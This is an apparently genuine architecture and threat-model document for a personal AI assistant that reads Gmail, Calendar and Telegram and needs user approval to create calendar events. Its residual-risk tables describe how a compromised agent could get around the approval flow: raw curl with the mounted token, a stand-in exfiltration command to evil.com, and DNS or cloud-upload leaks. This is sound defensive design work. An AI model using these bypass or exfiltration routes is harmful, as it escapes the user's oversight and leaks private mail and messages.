# Architecture Summary (v3): Privacy-First Personal Assistant

*Customized NanoClaw fork (Zorya) with application-layer write protection and ephemeral containers. Extends NanoClaw's existing single-process architecture rather than building parallel infrastructure.*

---

## What This System Does

A personal AI assistant built on Zorya (NanoClaw fork) that solves three specific problems:

1. **Pending message replies** — Tracks Telegram conversations where someone messaged you and you haven't replied. Nudges you with a summary.

2. **Pending email replies** — Monitors your Gmail inbox, detects threads where someone is waiting for your response, and reminds you.

3. **Meeting scheduling from context** — Reads your messages and emails, recognizes scheduling intent ("let's find a time next week"), checks your calendar availability, and proposes events for user approval.

Plus: morning briefings, deadline detection, and reminders.

---

## Design Principles

This architecture follows NanoClaw's philosophy:

- **Single process.** Everything runs in the existing NanoClaw Node.js process. The only new host-side process is the Telegram MTProto reader (security-justified). No microservices, no message queues.
- **Agent does the work.** The agent has CLI tools inside the container. It calls Google APIs via a baked-in `google-api` CLI — no Python runtime, no third-party MCP servers.
- **Use what exists.** Scheduler: `task-scheduler.ts`. Memory: `CLAUDE.md` files. SQLite: `db.ts`. Don't rebuild these.
- **Application-layer write protection.** The agent's CLI tools only expose read commands. Write operations (calendar events) require explicit user approval via the host process. See "Security Model" for details.
- **AI-native.** Setup via Claude Code, debugging via "ask Claude to read the logs."

---

## Credentials and Scopes

### Google OAuth (single token)

A single OAuth token at `~/.google-oauth/oauth.json` with all scopes:

| API | Scope | Access Level |
|-----|-------|-------------|
| Gmail | `gmail.readonly` | Read messages, threads, labels. Cannot send, delete, or modify. |
| Calendar | `calendar.readonly` | Read calendar list and events. |
| Calendar | `calendar.events` | Read + create events. |
| Calendar | `calendar.freebusy` | Check availability. |

**Why a single token instead of separate read/write tokens:**
- Simpler setup — one OAuth flow, one file, no scope confusion
- Same practical security — the container's `google-api` CLI has no write commands. The agent can read the calendar but has no tool to create events. Event creation only happens on the host via the approval handler.
- The protection is at the application layer (CLI tool API surface), not the credential layer. A compromised agent could theoretically craft raw curl commands to write — this is accepted as residual risk for v1 (see Threat Model).

**Token refresh:** The container's `google-api` CLI handles refresh internally. The host's `calendar-approval.ts` also refreshes and writes updated tokens back to `oauth.json`.

### Telegram Tokens

| Token | Location | Purpose |
|-------|----------|---------|
| MTProto session (GramJS) | Host-side reader process only | Read all conversations as the user |
| Bot API token | Container (env var) + host process | Send notifications via separate bot identity |

### Claude API Key

Standard Anthropic API key. Passed to container via env var.

---

## Architecture

```
┌──────────────────────────────────────────────────────────────────────┐
│  HOST MACHINE                                                        │
│                                                                      │
│  ┌─────────────────────────────────────────────────────────────────┐ │
│  │  NANOCLAW PROCESS (single Node.js process)                      │ │
│  │                                                                  │ │
│  │  Existing:                                                       │ │
│  │    Telegram bot (grammy)        — message I/O, inline keyboards │ │
│  │    Task scheduler               — cron-based scheduled tasks    │ │
│  │    Container runner             — spawns Docker containers      │ │
│  │    SQLite (db.ts)               — messages, groups, tasks       │ │
│  │                                                                  │ │
│  │  New:                                                            │ │
│  │    Calendar approval handler    — inline keyboard callbacks     │ │
│  │      Reads: ~/.google-oauth/oauth.json (same token as agent)    │ │
│  │      On "Create": validates, calls Calendar API events.insert   │ │
│  │      On "Skip": discards proposal, sends acknowledgment        │ │
│  │    Event proposals table        — added to existing SQLite      │ │
│  └─────────────────────────────────────────────────────────────────┘ │
│                                                                      │
│  ┌─────────────────────────────────────────────────────────────────┐ │
│  │  NANOCLAW CONTAINER                                              │ │
│  │  (Docker, --rm, ephemeral per invocation)                        │ │
│  │                                                                  │ │
│  │  Credentials:                                                    │ │
│  │    ~/.google-oauth/oauth.json     → mounted read-only           │ │
│  │      (has all scopes including calendar.events write)           │ │
│  │    TELEGRAM_BOT_TOKEN (env)       → Bot API                     │ │
│  │    ANTHROPIC_API_KEY (env)        → Claude API                  │ │
│  │                                                                  │ │
│  │  NOT in container:                                               │ │
│  │    ✗ MTProto session                                            │ │
│  │                                                                  │ │
│  │  ┌───────────────────────────────────────────────────────┐      │ │
│  │  │  AGENT (Claude Agent SDK)                              │      │ │
│  │  │                                                        │      │ │
│  │  │  CLI tools baked into the container image:             │      │ │
│  │  │                                                        │      │ │
│  │  │  google-api gmail list/read/labels                     │      │ │
│  │  │    Read-only CLI — no send or modify commands          │      │ │
│  │  │                                                        │      │ │
│  │  │  google-api calendar list/today/freebusy               │      │ │
│  │  │    Read-only CLI — no create/update/delete commands    │      │ │
│  │  │                                                        │      │ │
│  │  │  telegram-reader pending-replies/conversation          │      │ │
│  │  │    Calls host-side MTProto reader via localhost API    │      │ │
│  │  │                                                        │      │ │
│  │  │  MCP tools (via ipc-mcp-stdio.ts):                    │      │ │
│  │  │    send_message    → IPC → host routes to chat        │      │ │
│  │  │    schedule_task   → IPC → host creates cron task     │      │ │
│  │  │    propose_event   → IPC → host sends inline keyboard │      │ │
│  │  │                                                        │      │ │
│  │  │  Memory:                                               │      │ │
│  │  │    Reads/writes CLAUDE.md (existing NanoClaw system)   │      │ │
│  │  │                                                        │      │ │
│  │  └───────────────────────────────────────────────────────┘      │ │
│  │                                                                  │ │
│  │  Storage (existing NanoClaw mounts):                             │ │
│  │    groups/{name}/         (rw)  CLAUDE.md, agent files           │ │
│  │    data/sessions/{name}/  (rw)  session data                     │ │
│  └─────────────────────────────────────────────────────────────────┘ │
│                                                                      │
│  ┌─────────────────────────────────────────────────────────────────┐ │
│  │  TELEGRAM MTPROTO READER (one new host-side process)            │ │
│  │                                                                  │ │
│  │  Holds: MTProto session (GramJS) — full read access             │ │
│  │  Exposes: localhost HTTP API (:8081)                             │ │
│  │    GET /pending-replies     → conversations awaiting reply      │ │
│  │    GET /conversation/:id    → recent messages                   │ │
│  │  Read-only. Cannot send messages or modify anything.            │ │
│  │  Container reaches via host.docker.internal:8081                │ │
│  └─────────────────────────────────────────────────────────────────┘ │
│                                                                      │
└──────────────────────────────────────────────────────────────────────┘
```

---

## What the Agent Does

The agent uses CLI tools baked into the container image. No raw curl, no Python, no third-party MCP servers.

### Email (Gmail API, `gmail.readonly`)

Via `google-api gmail list/read/labels`:
- List recent emails with search filters
- Read full email threads
- Find pending replies (threads where last message isn't from the user)
- Search with full Gmail syntax (`from:alice after:2025/02/01`)

The agent CANNOT send, delete, or modify emails — the `gmail.readonly` scope prevents it (403).

### Calendar (Calendar API)

Via `google-api calendar list/today/freebusy`:
- List events in a date range
- Check availability via freebusy queries

The CLI has no write commands. Event creation goes through the `propose_event` MCP tool → host approval flow.

### Telegram Conversations (via MTProto reader)

Via `telegram-reader pending-replies/conversation`:
- Get pending replies (conversations awaiting user response)
- Get conversation context (recent messages from a specific chat)

The agent CANNOT send messages as the user. It has no MTProto session.

### Memory (CLAUDE.md)

The agent reads and writes `CLAUDE.md` in its group folder — NanoClaw's existing memory system. No custom SQLite database.

### Scheduling (existing task-scheduler.ts)

The agent uses NanoClaw's existing `schedule_task` MCP tool. No custom scheduler.

---

## Default Scheduled Tasks

These use NanoClaw's existing scheduler. They're standard scheduled tasks — the agent runs in a container with CLI tool access to Google APIs and the MTProto reader. Tasks are created interactively via the agent.

| Task | Schedule | What the Agent Does |
|------|----------|---------------------|
| **Morning briefing** | Cron: `0 7 * * 1-5` | Calendar → today's events. Gmail → pending emails. Telegram reader → pending replies. Compose and send summary. |
| **Pending reply check** | Cron: `0 */2 * * 1-5` | Gmail + Telegram reader → pending replies. If any, send summary. |
| **Email scan** | Cron: `5 7 * * 1-5` | Search recent emails for deadlines, action items, scheduling intent. Create reminders. Propose events. |
| **Meeting detection** | Cron: `30 */2 * * 1-5` | Scan recent messages/emails for scheduling intent. Check availability, propose events. |
| **Evening summary** | Cron: `0 18 * * 1-5` | Summarize: events that happened, pending items still open. |

---

## Calendar Event Approval Flow

The agent can read the calendar but has no tool to create events. Event creation requires explicit user approval.

```
Agent detects scheduling intent
  ("Alice said: let's meet next Tuesday")
       │
       ▼
Agent calls google-api calendar freebusy
  check availability → finds free slots
       │
       ▼
Agent calls propose_event MCP tool
  (title, start/end times, attendees, description)
       │
       ▼
Host receives proposal via IPC,
validates fields, stores in event_proposals table,
sends Telegram inline keyboard:
  ┌──────────────────────────────────────────┐
  │  📅 Meeting with Alice                    │
  │  Tue 25 Feb, 14:00 – 15:00              │
  │  Attendees: alice@example.com             │
  │                                           │
  │  [✅ Create]  [❌ Skip]                    │
  └──────────────────────────────────────────┘
       │
       ▼ (user taps a button)
       │
  ┌────┴─────────────────────────────────┐
  │                                       │
  ▼                                       ▼
"Create"                              "Skip"
  │                                       │
  ▼                                       ▼
TelegramChannel callback handler      Updates proposal status,
(in existing NanoClaw process)        sends acknowledgment
  │
  ▼
Validates event fields
Calls Calendar API events.insert
  (using oauth.json from host filesystem)
Sends confirmation to user:
  "✅ Event created: Meeting with Alice"
```

Proposals expire after 24 hours.

---

## Security Model

### Defense Layers (v1)

| Layer | What It Enforces |
|-------|-----------------|
| **Gmail scope** | `gmail.readonly` — agent cannot send, delete, or modify emails. Enforced by Google at the API level. |
| **Calendar write protection** | The `google-api` CLI in the container has no write commands. Event creation only via host approval handler. |
| **Ephemeral containers** | Each agent invocation runs in a fresh container (`--rm`). No persistence between runs. |
| **MTProto isolation** | Session on host only, exposed as read-only API. Agent cannot send messages as user. |
| **Calendar approval flow** | User sees every event before creation. Must explicitly tap "Create." |
| **No third-party tool code** | No MCP servers from npm. CLI tools and MCP tools are in the codebase you control. |

### What Is Structurally Prevented

| Attack | Result |
|--------|--------|
| Send email as the user | **Blocked** — `gmail.readonly` scope, enforced by Google API (403) |
| Delete user's emails | **Blocked** — no `gmail.modify` scope |
| Send Telegram messages as the user | **Blocked** — MTProto session on host only. Container has only Bot API token. |
| Access Google Drive / Contacts / other services | **Blocked** — OAuth scopes are per-API, no other APIs authorized |

### What Is Prevented by Application Layer

| Attack | Result |
|--------|--------|
| Create calendar events silently | **Prevented** — `google-api` CLI has no write commands. The `propose_event` MCP tool sends a proposal to the host, which requires user approval. |
| Bypass via raw curl to Calendar API | **Not structurally prevented** — the OAuth token has `calendar.events` write scope. A compromised agent could craft a raw curl POST. This is accepted residual risk for v1 (see below). |

### Deferred to v2

| Item | Why Deferred |
|------|-------------|
| **Container hardening** (`--cap-drop ALL`, `--read-only`, `--no-new-privileges`) | Containers are already ephemeral (`--rm`). Hardening flags risk breaking agent functionality for marginal benefit. |
| **Network firewall** (iptables/squid) | Application-layer protection handles the main threats. Adds significant ops complexity. |
| **Structured audit log** (JSONL) | Container logs + NanoClaw logs are sufficient. AI-native: "ask Claude to read the logs." |
| **DNS restriction** | Depends on firewall. |

---

## Threat Model: Residual Risk (v1, no firewall)

Without a firewall, some attacks that would be blocked in v2 are possible in v1. Honest accounting:

### Blocked by Gmail scope (structural, enforced by Google)

| Attack | Why Blocked |
|--------|-------------|
| Send email as user | `gmail.readonly` — no send scope |
| Delete/modify emails | `gmail.readonly` — no modify scope |

### Blocked by MTProto isolation (structural)

| Attack | Why Blocked |
|--------|-------------|
| Send Telegram messages as user | MTProto session not in container |

### Blocked by application layer (CLI tool surface)

| Attack | Why Blocked |
|--------|-------------|
| Create calendar events via CLI | `google-api` CLI has no write subcommands |
| Create events via `propose_event` | Requires user to tap "Create" in Telegram |

### NOT blocked without firewall (v1 residual risk)

| Attack | Risk | Mitigation |
|--------|------|------------|
| Raw curl to Calendar API with mounted token | Agent could create events directly, bypassing approval | **Accepted for v1.** Token has `calendar.events` scope. Application-layer protection only. Add network firewall in v2 to restrict allowed API endpoints. |
| `curl https://evil.com/steal?data=...` | Agent could exfiltrate data read from Gmail/Calendar | **Accepted for v1.** Credential scoping limits what data is readable. Add firewall in v2. |
| DNS exfiltration | Agent could encode data in DNS queries | **Accepted for v1.** Low practical risk for personal use. |
| Upload to cloud storage | Agent could upload to S3/GCS | **Accepted for v1.** No storage credentials, but network is open. |

### Blocked by calendar approval flow

| Attack | Why Blocked |
|--------|-------------|
| Calendar event exfiltration (encode data in event fields) | User sees every event before creation |
| Calendar attendee exfiltration (add attacker as attendee) | User sees attendee list before approving |

### Low risk

| Attack | Why Low Risk |
|--------|-------------|
| Notification channel exfiltration | Agent sends to user's own chat only (registered recipient). User sees all messages. |
| LLM prompt exfiltration | Requires separate compromise of Anthropic account. |

---

## Telegram Architecture Decision

The MTProto userbot session has **full write access** — send messages as the user, join/leave groups, delete messages. It's the most dangerous credential.

**Decision:** Split into two components:

| Component | Credential | Location | Access |
|-----------|-----------|----------|--------|
| **Read path** | MTProto session (GramJS) | Host-side process (the one new process) | Reads conversations, exposes via localhost API |
| **Write path** | Bot API token | Container + host process | Sends notifications via separate bot identity |

Even a fully compromised agent cannot send Telegram messages as the user. The worst it can do is send bot notifications (visible to user, low risk).

---

## Technology Stack

| Component | Choice | Why |
|-----------|--------|-----|
| Agent base | Zorya (NanoClaw fork) | Single-process TypeScript, container lifecycle, Agent SDK |
| Container | Docker, ephemeral (`--rm`) | Fresh container per invocation, no persistence between runs |
| Agent tools | `google-api` + `telegram-reader` CLIs (baked into container) | No Python, no third-party MCP servers. All code in the repo. |
| Gmail | `google-api gmail` CLI | `gmail.readonly`, read-only by scope |
| Calendar read | `google-api calendar` CLI | Read-only by CLI surface (no write commands) |
| Calendar write | NanoClaw host process (`calendar-approval.ts`) | Uses same `oauth.json`, only on user approval |
| Telegram read | GramJS (MTProto) — host-side only | Full conversation access, too dangerous for container |
| Telegram write | grammy (Bot API) — existing NanoClaw bot | Notifications via bot identity |
| Memory | CLAUDE.md files per group | Existing NanoClaw system, no custom database |
| Scheduling | task-scheduler.ts | Existing NanoClaw scheduler, cron-based |
| OAuth | Custom Node.js script (`scripts/google-oauth.ts`) | Single token, all needed scopes, no third-party packages |

---

## Setup Flow

Two paths depending on who's setting up.

### Developer Setup (Claude Code)

For the developer. Requires `claude` CLI.

```
cd zorya && claude
> /setup
```

Claude Code guides through GCP project creation, OAuth flow, Telegram MTProto setup, scheduled task creation, and test notification.

### Client/VPS Setup (standalone script)

For deploying to a client's VPS. No Claude Code needed. Deterministic.

```
ssh vps
git clone ... && cd zorya && npm install
./setup.sh
# follow prompts: API key, bot token, Google OAuth, Telegram MTProto
```

**Google OAuth on a headless VPS (no browser):**

1. **Copy-paste URL** — Script prints the consent URL. User opens it on their laptop, clicks Allow, copies the redirect URL from the browser bar, pastes it back into the terminal.
2. **Local-to-VPS transfer** — User runs the OAuth script on their local machine, then `scp`s `oauth.json` to the VPS.

The script auto-detects: browser available → localhost callback. No browser → copy-paste flow.

---

## What This System Does NOT Do

| Excluded | Why |
|----------|-----|
| Send emails | No `gmail.send` scope. Enforced by Google API. |
| Create calendar events without approval | CLI has no write commands. `propose_event` requires user to tap "Create." |
| Reply to messages as the user | Bot identity for notifications. MTProto session on host only. |
| Delete or modify emails/messages | No modify scopes. |
| Access files on Drive/Dropbox | No credentials, no scopes. |
| Run third-party MCP servers or plugins | No plugin system. All tools are in the repo. |

---

## Future Extensions

| Extension | What's Needed | Risk Change |
|-----------|--------------|-------------|
| **Network firewall** (v2) | iptables/nftables or squid proxy | Blocks raw curl to Calendar API, HTTP exfiltration, DNS exfiltration |
| **Structured audit log** (v2) | Append-only JSONL on host volume | Better forensics, query monitoring |
| Smart reply suggestions | No new credentials — agent drafts reply, user copy/pastes | None |
| Email sending (opt-in) | Add `gmail.send` scope, rate limiting | Medium — compromised agent could send email |
| Web search | Agent already has web access in container | None |
| File access (Drive) | Add `drive.readonly` scope | Low — same scoping model as Gmail |
